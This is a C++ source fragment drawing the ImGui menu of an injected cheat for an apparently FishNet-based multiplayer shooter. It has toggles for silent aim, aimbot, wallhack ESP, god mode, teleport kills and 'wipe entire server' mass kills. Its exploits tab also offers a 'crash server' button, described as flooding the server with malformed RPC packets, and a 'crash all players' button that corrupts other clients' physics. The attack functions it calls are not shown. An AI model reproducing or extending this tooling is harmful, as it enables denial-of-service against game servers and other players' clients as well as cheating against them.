                    "  [~] WEAPONS  ",
                    "  [X] EXPLOITS  ",
                    "  [*] COLORS  ",
                    "  [!] LOGS & ENGINE  "
                };

                for (int t = 0; t < IM_ARRAYSIZE(navTabs); t++) {
                    bool isActive = (iTopNavTab == t);
                    if (isActive) {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.18f, 0.32f, 0.56f, 0.95f));
                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 1.0f, 1.0f, 1.0f));
                    } else {
                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.10f, 0.11f, 0.16f, 0.65f));
                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.72f, 0.76f, 0.85f, 1.0f));
                    }

                    if (ImGui::Button(navTabs[t], ImVec2(0, 32))) {
                        iTopNavTab = t;
                    }
                    ImGui::PopStyleColor(2);

                    if (t < IM_ARRAYSIZE(navTabs) - 1) {
                        ImGui::SameLine(0, 6.0f);
                    }
                }

                // Right Status Chip & Search
                ImGui::SameLine(ImGui::GetWindowWidth() - 210.0f);
                ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4.0f);
                ImGui::TextColored(ImVec4(0.20f, 0.85f, 0.40f, 1.0f), "[*] ACTIVE (%.0f FPS)", io.Framerate);
            }
            ImGui::EndChild();

            ImGui::Separator();
            ImGui::Spacing();

            // ── LEFT NAVIGATION SIDEBAR (Quick Controls & Master Switches) ──
            ImGui::BeginChild("Sidebar", ImVec2(240, 0), true);
            {
                ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "QUICK SWITCHES");
                ImGui::Separator();
                ImGui::Spacing();

                ImGui::Checkbox("Silent Aim",     &bEnableSilentAim);
                ImGui::Checkbox("Smooth Aimbot",  &bEnableAimbot);
                ImGui::Checkbox("Player ESP",     &bEnableESP);
                ImGui::Checkbox("Player Chams",   &bEnableChams);
                ImGui::Checkbox("Infinite Ammo",  &bInfiniteAmmo);
                ImGui::Checkbox("99,999 Damage",  &bOneHitKillDamage);
                ImGui::Checkbox("Teleport Kill",  &bEnableTeleportKill);
                ImGui::Checkbox("Mass Kill Aura", &bEnableMassKill);
                ImGui::Checkbox("God Mode",       &bGodMode);

                ImGui::Spacing();
                ImGui::Separator();
                ImGui::Spacing();

                ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "MODULE SHORTCUTS");
                ImGui::Spacing();

                if (DrawMaterialNavButton("Silent Aim & Combat", iTopNavTab == 0, "[>]")) iTopNavTab = 0;
                if (DrawMaterialNavButton("ESP & Chams",        iTopNavTab == 1, "[o]")) iTopNavTab = 1;
                if (DrawMaterialNavButton("Weapon Spawner",     iTopNavTab == 2, "[~]")) iTopNavTab = 2;
                if (DrawMaterialNavButton("Exploits & Teleport",iTopNavTab == 3, "[X]")) iTopNavTab = 3;
                if (DrawMaterialNavButton("Colors & Palette",   iTopNavTab == 4, "[*]")) iTopNavTab = 4;
                if (DrawMaterialNavButton("Game Engine Logs",   iTopNavTab == 5, "[!]")) iTopNavTab = 5;

                ImGui::Spacing();
                ImGui::Separator();
                ImGui::Spacing();

                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.20f, 0.45f, 0.85f, 0.90f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.30f, 0.60f, 1.00f, 1.0f));
                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.15f, 0.35f, 0.75f, 1.0f));
                if (ImGui::Button("⚡ LOAD HVH RAGE CONFIG", ImVec2(-1, 38))) {
                    LoadHvHConfig();
                }
                ImGui::PopStyleColor(3);

                ImGui::Spacing();

                ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.55f, 0.12f, 0.12f, 0.85f));
                ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.80f, 0.18f, 0.18f, 1.0f));
                ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.40f, 0.08f, 0.08f, 1.0f));
                if (ImGui::Button("UNINJECT CHEAT", ImVec2(-1, 38))) {
                    RequestUninject();
                }
                ImGui::PopStyleColor(3);
            }
            ImGui::EndChild();

            ImGui::SameLine();

            // ── MAIN CONTENT AREA (Modular Responsive Cards) ──
            ImGui::BeginChild("MainContent", ImVec2(0, 0), false);
            {
                // ═════════════════════════════════════════════════════════════
                // TAB 0: COMBAT & SILENT AIM
                // ═════════════════════════════════════════════════════════════
                if (iTopNavTab == 0) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Silent Aim ──
                    ImGui::BeginChild("CardSilentAim", ImVec2(halfWidth, 420), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "%s", "Silent Aim (100% Hit Any Shot)");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableSilentAim ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableSilentAim ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Enable Silent Aim", &bEnableSilentAim);
                        ImGui::Checkbox("Full 360° Hit (Anywhere on Map)", &bSilentAimFull360);
                        ImGui::Checkbox("Draw Silent Aim FOV Circle", &bDrawSilentAimFOV);
                        ImGui::Spacing();

                        const char* targetBones[] = { "Chest / Torso", "Head", "Root / Pelvis" };
                        ImGui::Combo("Target Hit Bone", &iSilentAimTarget, targetBones, IM_ARRAYSIZE(targetBones));
                        ImGui::Spacing();

                        if (!bSilentAimFull360) {
                            ImGui::SliderFloat("Silent Aim FOV", &fSilentAimFOV, 20.0f, 800.0f, "%.0f px");
                        }

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "Silent Aim Mechanics:");
                        ImGui::BulletText("Directly reroutes weapon raycasts in CMDShoot.");
                        ImGui::BulletText("Bullets hit the target instantly regardless of crosshair pos.");
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Smooth Aimbot & Recoil Control ──
                    ImGui::BeginChild("CardAimbot", ImVec2(halfWidth, 420), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Smooth Aimbot & RCS");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableAimbot ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableAimbot ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Enable Smooth Aimbot", &bEnableAimbot);
                        ImGui::Checkbox("Auto-fire on Target Lock", &bAimbotAutoFire);
                        ImGui::Checkbox("Draw Aimbot FOV circle", &bDrawAimbotFOV);
                        ImGui::Combo("Aimbot Hotkey", &iAimbotKey, g_KeyNames, IM_ARRAYSIZE(g_KeyNames));

                        ImGui::SliderFloat("FOV Radius", &aimbotFOV, 20.0f, 500.0f, "%.1f px");
                        ImGui::SliderFloat("Smoothing",  &aimbotSmooth, 1.0f, 25.0f, "%.1f");

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Recoil Control System (RCS)", &bRecoilCompensation);
                        if (bRecoilCompensation) {
                            ImGui::SliderFloat("RCS Pitch (Y)", &fRecoilY, 0.0f, 2.0f, "%.3f");
                            ImGui::SliderFloat("RCS Yaw (X)",   &fRecoilX, 0.0f, 2.0f, "%.3f");
                        }
                    }
                    ImGui::EndChild();

                    ImGui::Spacing();

                    // ── CARD 3: Triggerbot & God Mode ──
                    ImGui::BeginChild("CardTriggerbot", ImVec2(0, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Triggerbot & Combat Invulnerability");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Columns(3, "CombatCols", false);

                        ImGui::Checkbox("Enable Triggerbot", &bTriggerbot);
                        ImGui::Checkbox("Headshots Only", &bTriggerbotHeadOnly);
                        ImGui::SliderFloat("Reaction Delay", &fTriggerbotDelay, 0.0f, 0.5f, "%.3f s");

                        ImGui::NextColumn();

                        ImGui::Checkbox("God Mode (Invulnerability)", &bGodMode);
                        ImGui::TextDisabled("Freezes health at 99,999 HP & prevents all incoming damage.");

                        ImGui::NextColumn();

                        if (ImGui::Button("Wipe All Enemies (Mass Kill)", ImVec2(-1, 38))) {
                            DoMassKill();
                        }

                        ImGui::Columns(1);
                    }
                    ImGui::EndChild();
                }

                // ═════════════════════════════════════════════════════════════
                // TAB 1: VISUALS & CUSTOMIZABLE CHAMS
                // ═════════════════════════════════════════════════════════════
                else if (iTopNavTab == 1) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Player ESP Overlays ──
                    ImGui::BeginChild("CardESP", ImVec2(halfWidth, 420), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Player ESP Overlays");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableESP ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableESP ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Master ESP Enable",    &bEnableESP);
                        ImGui::Checkbox("Dynamic 2D Hitbox Box",&bDrawBoxes);
                        ImGui::Checkbox("Ragdoll Skeleton",     &bDrawSkeleton);
                        ImGui::Checkbox("Head Circle ESP",      &bDrawHeadCircle);
                        ImGui::Checkbox("Tracers (Snaplines)",  &bDrawTracers);
                        ImGui::Checkbox("Health Bars",          &bDrawHealthBar);
                        ImGui::Checkbox("Distance & Info Text", &bDrawInfoText);
                        ImGui::Checkbox("Neon Glow Bloom",      &bEnableGlow);

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        if (bDrawBoxes)       ImGui::SliderFloat("Box Thickness",      &fBoxThickness, 1.0f, 5.0f, "%.1f px");
                        if (bDrawSkeleton)    ImGui::SliderFloat("Skeleton Thickness", &fSkeletonThickness, 1.0f, 5.0f, "%.1f px");
                        if (bDrawTracers)     ImGui::SliderFloat("Tracer Thickness",   &fTracerThickness, 1.0f, 6.0f, "%.1f px");
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Customizable Chams ──
                    ImGui::BeginChild("CardChams", ImVec2(halfWidth, 420), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Customizable Player Chams");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableChams ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableChams ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Enable Chams", &bEnableChams);
                        ImGui::Spacing();

                        const char* chamsStyles[] = {
                            "Solid Flat Silhouette",
                            "Translucent Glass / Glow",
                            "Wireframe Mesh",
                            "Neon Pulse Glow"
                        };
                        ImGui::Combo("Chams Style", &iChamsStyle, chamsStyles, IM_ARRAYSIZE(chamsStyles));
                        ImGui::Spacing();

                        ImGui::SliderFloat("Chams Opacity (Alpha)", &fChamsAlpha, 0.10f, 1.00f, "%.2f");
                        ImGui::SliderFloat("Joint & Bone Radius",   &fChamsJointSize, 0.5f, 3.0f, "%.1fx");

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::ColorEdit4("Enemy Chams Color", colChamsEnemyVis);
                        ImGui::ColorEdit4("Team Chams Color",  colChamsTeamVis);
                    }
                    ImGui::EndChild();

                    ImGui::Spacing();

                    // ── CARD 3: Filters & Settings ──
                    ImGui::BeginChild("CardFilters", ImVec2(0, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "ESP Filters & Culling Settings");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Columns(3, "FilterCols", false);

                        ImGui::Checkbox("Ignore Teammates", &bIgnoreTeammates);
                        ImGui::Checkbox("Ignore Self",      &bIgnoreLocal);
                        ImGui::Checkbox("Ignore Dead Corpses", &bIgnoreDead);

                        ImGui::NextColumn();

                        ImGui::SliderFloat("Max Render Distance", &fMaxDistance, 50.0f, 1000.0f, "%.0f m");
                        const char* origins[] = { "Screen Bottom", "Screen Center / Crosshair", "Screen Top" };
                        ImGui::Combo("Tracer Origin", &iTracerOrigin, origins, IM_ARRAYSIZE(origins));

                        ImGui::NextColumn();

                        if (bEnableGlow) {
                            ImGui::SliderFloat("Neon Glow Intensity", &fGlowIntensity, 0.2f, 2.5f, "%.1fx");
                        }
                        if (bDrawHeadCircle) {
                            ImGui::SliderFloat("Head Circle Scale", &fHeadCircleSize, 0.5f, 2.5f, "%.1fx");
                        }

                        ImGui::Columns(1);
                    }
                    ImGui::EndChild();
                }

                // ═════════════════════════════════════════════════════════════
                // TAB 2: WEAPONS & SPAWNER
                // ═════════════════════════════════════════════════════════════
                else if (iTopNavTab == 2) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Instant Weapon Spawner ──
                    ImGui::BeginChild("CardSpawner", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Instant Weapon Spawner");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Combo("Select Weapon", &iSelectedWeaponIndex, g_WeaponNames, IM_ARRAYSIZE(g_WeaponNames));
                        ImGui::Spacing();

                        if (ImGui::Button("EQUIP SELECTED WEAPON NOW", ImVec2(-1, 46))) {
                            GiveWeapon(iSelectedWeaponIndex);
                        }

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextDisabled("Quick Equip Grid:");
                        ImGui::Spacing();

                        for (int w = 0; w < IM_ARRAYSIZE(g_WeaponNames); w++) {
                            char btnLabel[64];
                            snprintf(btnLabel, sizeof(btnLabel), "Equip %s", g_WeaponNames[w]);
                            if (ImGui::Button(btnLabel, ImVec2(-1, 32))) {
                                iSelectedWeaponIndex = w;
                                GiveWeapon(w);
                            }
                            ImGui::Spacing();
                        }
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Weapon God Stat Overrides ──
                    ImGui::BeginChild("CardMods", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Weapon Power Overrides");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Infinite Ammo (99,999 in Clip)", &bInfiniteAmmo);
                        ImGui::TextDisabled("Never runs out of ammo; reload is not required.");
                        ImGui::Spacing();

                        ImGui::Checkbox("One-Hit Kill Damage (99,999 DMG)", &bOneHitKillDamage);
                        ImGui::TextDisabled("Overrides weapon min & max damage to 99,999.");
                        ImGui::Spacing();

                        ImGui::Checkbox("Rapid Fire Rate (Instant Firing)", &bRapidFire);
                        ImGui::TextDisabled("Removes firing cooldown for ultra-fast automatic shooting.");
                        ImGui::Spacing();

                        ImGui::Checkbox("Infinite Range (9,999m)", &bInfiniteRange);
                        ImGui::TextDisabled("Allows striking enemies anywhere across the whole map.");
                    }
                    ImGui::EndChild();
                }

                // ═════════════════════════════════════════════════════════════
                // TAB 3: POWERFUL EXPLOITS (MOVEMENT, GRAPPLE, TELEPORT, MASS KILL)
                // ═════════════════════════════════════════════════════════════
                else if (iTopNavTab == 3) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Movement & Physics Exploits ──
                    ImGui::BeginChild("CardMovementExploits", ImVec2(halfWidth, 310), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Movement & Physics Exploits");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Speedhack Multiplier", &bEnableSpeedhack);
                        if (bEnableSpeedhack) {
                            ImGui::SliderFloat("Speed Factor", &fSpeedMultiplier, 1.2f, 8.0f, "%.1fx");
                        }
                        ImGui::Spacing();

                        ImGui::Checkbox("Super High Jump", &bEnableSuperJump);
                        if (bEnableSuperJump) {
                            ImGui::SliderFloat("Jump Force", &fJumpMultiplier, 1.2f, 6.0f, "%.1fx");
                        }
                        ImGui::Spacing();

                        ImGui::Checkbox("Infinite Air Jump (Fly / Double Jump)", &bInfiniteAirJump);
                        ImGui::TextDisabled("Allows jumping repeatedly in mid-air with Spacebar.");
                        ImGui::Spacing();

                        ImGui::Checkbox("Zero Gravity (Float / Moon Physics)", &bZeroGravity);
                        if (!bZeroGravity) {
                            ImGui::SliderFloat("Gravity Scale", &fGravityMultiplier, 0.1f, 3.0f, "%.2fx");
                        }
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Grapple Hook Exploits ──
                    ImGui::BeginChild("CardGrappleExploits", ImVec2(halfWidth, 310), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Grappling Hook Exploits");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Infinite Grapple Range (9,999m)", &bInfiniteGrappleRange);
                        ImGui::TextDisabled("Hook onto surfaces & players from across the entire map.");
                        ImGui::Spacing();

                        ImGui::Checkbox("Super Grapple Reel Speed", &bSuperGrappleSpeed);
                        if (bSuperGrappleSpeed) {
                            ImGui::SliderFloat("Pull Speed Factor", &fGrappleSpeedMult, 1.5f, 8.0f, "%.1fx");
                        }
                        ImGui::Spacing();

                        ImGui::Checkbox("Instant Grapple Boost & No Cooldown", &bInstantGrappleBoost);
                        ImGui::Spacing();

                        ImGui::Checkbox("Grapple Magnet Aim (Auto-Snap to Players)", &bGrappleMagnetAim);
                    }
                    ImGui::EndChild();

                    ImGui::Spacing();

                    // ── CARD 3: Teleport Kill Backstab Cycler ──
                    ImGui::BeginChild("CardTeleportKill", ImVec2(halfWidth, 320), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Teleport Kill & Target Cycler");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableTeleportKill ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableTeleportKill ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Enable Teleport Kill", &bEnableTeleportKill);
                        ImGui::Checkbox("Hold Hotkey Only", &bTeleportHoldKey);
                        if (bTeleportHoldKey) {
                            ImGui::Combo("Teleport Key", &iTeleportKey, g_KeyNames, IM_ARRAYSIZE(g_KeyNames));
                        }

                        const char* targetModes[] = { "Random / Auto-Cycle Server", "Closest Distance", "Lowest HP First" };
                        ImGui::Combo("Target Mode", &iTeleportTargetMode, targetModes, IM_ARRAYSIZE(targetModes));

                        const char* posModes[] = { "Behind Enemy (Backstab)", "Above Enemy", "In Front", "Directly on Target" };
                        ImGui::Combo("Teleport Position", &iTeleportPosition, posModes, IM_ARRAYSIZE(posModes));

                        ImGui::SliderFloat("Distance Offset", &fTeleportDistance, 0.2f, 5.0f, "%.1f m");
                        ImGui::SliderFloat("Height Offset",   &fTeleportHeight,   -1.0f, 3.0f, "%.1f m");
                        ImGui::Checkbox("Auto-Shoot on Teleport", &bTeleportAutoShoot);
                        ImGui::Checkbox("Auto-Aim / LookAt Target", &bTeleportLookAt);
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 4: Server Annihilation & Camera FOV ──
                    ImGui::BeginChild("CardServerKill", ImVec2(halfWidth, 320), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Mass Kill Aura & Camera");
                        ImGui::SameLine(ImGui::GetWindowWidth() - 95.0f);
                        ImGui::TextColored(bEnableMassKill ? ImVec4(0.30f, 0.85f, 0.50f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bEnableMassKill ? "[ACTIVE]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Enable Mass Kill Aura", &bEnableMassKill);
                        const char* mkModes[] = {
                            "Direct Server Health Zero (RPC)",
                            "Multi-Raycast Silent CMDShoot",
                            "Hybrid Annihilation"
                        };
                        ImGui::Combo("Kill Exploit Mode", &iMassKillMode, mkModes, IM_ARRAYSIZE(mkModes));
                        ImGui::SliderFloat("Kill Interval Rate", &fMassKillInterval, 20.0f, 500.0f, "%.0f ms");

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::Checkbox("Custom Field of View (FOV Changer)", &bCustomFOV);
                        if (bCustomFOV) {
                            ImGui::SliderFloat("Camera FOV", &fCustomFOVValue, 60.0f, 140.0f, "%.0f deg");
                        }

                        ImGui::Spacing();
                        if (ImGui::Button("WIPE ENTIRE SERVER NOW", ImVec2(-1, 38))) {
                            DoMassKill();
                        }
                    }
                    ImGui::EndChild();

                    ImGui::Spacing();

                    // ── CARD 5: Server Crash ──
                    ImGui::BeginChild("CardServerCrash", ImVec2(halfWidth, 240), true);
                    {
                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.40f, 0.30f, 1.0f));
                        ImGui::Text("[!] SERVER CRASH EXPLOITS");
                        ImGui::PopStyleColor();
                        ImGui::SameLine(ImGui::GetWindowWidth() - 90.0f);
                        ImGui::TextColored(bServerCrashActive ? ImVec4(1.0f, 0.35f, 0.25f, 1.0f) : ImVec4(0.5f, 0.5f, 0.5f, 1.0f),
                                           bServerCrashActive ? "[FLOODING]" : "[OFF]");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextDisabled("Flood the FishNet server with malformed RPC packets.");
                        ImGui::TextDisabled("Causes server memory overflow / disconnect.");
                        ImGui::Spacing();

                        ImGui::Checkbox("Server RPC Flood (Continuous)", &bServerCrashActive);
                        ImGui::Spacing();

                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.55f, 0.12f, 0.08f, 0.90f));
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.85f, 0.15f, 0.10f, 1.0f));
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.40f, 0.08f, 0.05f, 1.0f));
                        if (ImGui::Button("CRASH SERVER NOW (SINGLE BURST)", ImVec2(-1, 36))) {
                            for (int i = 0; i < 50; i++) {  // 50x burst for instant effect
                                g_LastServerCrashTime = 0;
                                DoServerCrash();
                            }
                        }
                        ImGui::PopStyleColor(3);
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 6: Player Crash & Map Control ──
                    ImGui::BeginChild("CardMapDestroy", ImVec2(halfWidth, 240), true);
                    {
                        ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(1.0f, 0.60f, 0.15f, 1.0f));
                        ImGui::Text("[!] PLAYER CRASH & MAP CONTROL");
                        ImGui::PopStyleColor();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextDisabled("Teleports all enemy players to infinite coordinates.");
                        ImGui::TextDisabled("Corrupts PhysX AABB, causing client-side crash.");
                        ImGui::Spacing();

                        ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.45f, 0.20f, 0.05f, 0.90f));
                        ImGui::PushStyleColor(ImGuiCol_ButtonHovered, ImVec4(0.70f, 0.30f, 0.08f, 1.0f));
                        ImGui::PushStyleColor(ImGuiCol_ButtonActive, ImVec4(0.35f, 0.15f, 0.03f, 1.0f));
                        if (ImGui::Button("CRASH ALL PLAYERS NOW", ImVec2(-1, 36))) {
                            bCrashAllPlayersNow = true;
                        }
                        ImGui::PopStyleColor(3);

                        ImGui::Spacing();
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGui::TextDisabled("Map Destruction: Removes/freezes all enemies.");
                        ImGui::Checkbox("Map Destruction Mode (Auto)", &bMapDestructionActive);
                        ImGui::TextColored(bMapDestructionActive ? ImVec4(1.0f, 0.60f, 0.15f, 1.0f) : ImVec4(0.5f,0.5f,0.5f,1.0f),
                                           bMapDestructionActive ? "  Removing objects every 500ms..." : "  Inactive");

                        ImGui::Spacing();
                        if (ImGui::Button("DESTROY MAP PASS (ONCE)", ImVec2(-1, 36))) {
                            g_LastMapDestroyTime = 0;
                            bMapDestructionActive = true;
                            DoMapDestruction();
                            bMapDestructionActive = false;
                        }
                    }
                    ImGui::EndChild();
                }

                // ═════════════════════════════════════════════════════════════
                // TAB 4: INTERACTIVE RGB COLOR PICKER & THEME PALETTE
                // ═════════════════════════════════════════════════════════════

                else if (iTopNavTab == 4) {
                    float halfWidth = (ImGui::GetContentRegionAvail().x - 12.0f) * 0.5f;

                    // ── CARD 1: Interactive Material RGB / HSV Color Picker ──
                    ImGui::BeginChild("CardColorPicker", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Interactive RGB Color Picker");
                        ImGui::Separator();
                        ImGui::Spacing();

                        static int iSelectedColorTarget = 0;
                        const char* colorTargets[] = {
                            "Enemy Visible (ESP & Glow)",
                            "Teammate Visible",
                            "Skeleton / Bone Structure",
                            "Snaplines / Tracers",
                            "Head Hitbox Circle",
                            "Chams: Enemy Visible",
                            "Chams: Enemy Occluded",
                            "Chams: Team Visible",
                            "Chams: Team Occluded"
                        };
                        ImGui::Combo("Select Target", &iSelectedColorTarget, colorTargets, IM_ARRAYSIZE(colorTargets));
                        ImGui::Spacing();

                        float* currentEditingCol = colEnemy;
                        switch (iSelectedColorTarget) {
                            case 0: currentEditingCol = colEnemy; break;
                            case 1: currentEditingCol = colTeam; break;
                            case 2: currentEditingCol = colSkeleton; break;
                            case 3: currentEditingCol = colTracers; break;
                            case 4: currentEditingCol = colHeadCircle; break;
                            case 5: currentEditingCol = colChamsEnemyVis; break;
                            case 6: currentEditingCol = colChamsEnemyOcc; break;
                            case 7: currentEditingCol = colChamsTeamVis; break;
                            case 8: currentEditingCol = colChamsTeamOcc; break;
                        }

                        ImGuiColorEditFlags pickerFlags = ImGuiColorEditFlags_PickerHueWheel |
                                                          ImGuiColorEditFlags_AlphaBar |
                                                          ImGuiColorEditFlags_DisplayRGB |
                                                          ImGuiColorEditFlags_DisplayHex |
                                                          ImGuiColorEditFlags_AlphaPreviewHalf |
                                                          ImGuiColorEditFlags_InputRGB;

                        ImGui::ColorPicker4("##MainColorPicker", currentEditingCol, pickerFlags);
                        ImGui::Spacing();

                        ImGui::TextColored(ImVec4(0.35f, 0.65f, 1.00f, 1.0f), "Quick Preset Swatches:");
                        if (ImGui::Button("Electric Blue", ImVec2(100, 28))) { currentEditingCol[0]=0.20f; currentEditingCol[1]=0.70f; currentEditingCol[2]=1.00f; currentEditingCol[3]=1.0f; }
                        ImGui::SameLine();
                        if (ImGui::Button("Neon Crimson", ImVec2(100, 28))) { currentEditingCol[0]=1.00f; currentEditingCol[1]=0.22f; currentEditingCol[2]=0.35f; currentEditingCol[3]=1.0f; }
                        ImGui::SameLine();
                        if (ImGui::Button("Toxic Lime",   ImVec2(100, 28))) { currentEditingCol[0]=0.30f; currentEditingCol[1]=1.00f; currentEditingCol[2]=0.40f; currentEditingCol[3]=1.0f; }
                        
                        if (ImGui::Button("Acid Gold",    ImVec2(100, 28))) { currentEditingCol[0]=1.00f; currentEditingCol[1]=0.85f; currentEditingCol[2]=0.20f; currentEditingCol[3]=1.0f; }
                        ImGui::SameLine();
                        if (ImGui::Button("Cyber Purple", ImVec2(100, 28))) { currentEditingCol[0]=0.80f; currentEditingCol[1]=0.20f; currentEditingCol[2]=1.00f; currentEditingCol[3]=1.0f; }
                        ImGui::SameLine();
                        if (ImGui::Button("Pure White",   ImVec2(100, 28))) { currentEditingCol[0]=1.00f; currentEditingCol[1]=1.00f; currentEditingCol[2]=1.00f; currentEditingCol[3]=1.0f; }
                    }
                    ImGui::EndChild();

                    ImGui::SameLine();

                    // ── CARD 2: Quick Palette Swatches & Palette Overview ──
                    ImGui::BeginChild("CardColorPalette", ImVec2(halfWidth, 0), true);
                    {
                        ImGui::TextColored(ImVec4(1.0f, 1.0f, 1.0f, 1.0f), "Theme Palette Overview");
                        ImGui::Separator();
                        ImGui::Spacing();

                        ImGuiColorEditFlags miniEditFlags = ImGuiColorEditFlags_AlphaBar | ImGuiColorEditFlags_AlphaPreviewHalf;

                        ImGui::ColorEdit4("Enemy / Target",        colEnemy, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Teammate",              colTeam, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Skeleton Bones",        colSkeleton, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Snaplines / Tracers",   colTracers, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Head Hitbox",           colHeadCircle, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Chams Enemy (Visible)", colChamsEnemyVis, miniEditFlags);
                        ImGui::Spacing();
                        ImGui::ColorEdit4("Chams Enemy (Occluded)",colChamsEnemyOcc, miniEditFlags);
                        ImGui::Spacing();
